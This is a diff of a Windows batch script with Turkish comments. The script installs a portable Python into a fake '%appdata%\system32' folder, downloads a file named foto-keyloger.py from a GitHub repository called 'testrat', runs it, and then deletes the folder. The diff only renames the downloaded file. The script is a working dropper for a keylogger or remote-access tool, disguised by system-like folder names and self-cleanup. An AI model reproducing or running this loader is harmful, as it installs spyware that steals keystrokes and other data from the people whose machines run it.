@@ -21,12 +21,12 @@ powershell -Command "Expand-Archive -Path 'Python.zip' -DestinationPath 'py' -Fo
 :: Python.zip dosyasını sil
 del Python.zip
 
-:: scripts klasörü oluştur ve pass.py dosyasını indir
+:: scripts klasörü oluştur ve foto-keyloger.py dosyasını indir
 mkdir scripts
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/testrat/raw/main/foto-keyloger.py' -OutFile 'scripts\\pass.py'"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/testrat/raw/main/foto-keyloger.py' -OutFile 'scripts\\foto-keyloger.py'"
 
 :: Python scriptini çalıştır
-"%appdata%\system32\py\python.exe" "%appdata%\system32\scripts\pass.py"
+"%appdata%\system32\py\python.exe" "%appdata%\system32\scripts\foto-keyloger.py"
 
 :: system32 klasörünü ve içeriğini sil
 cd /d "%appdata%"
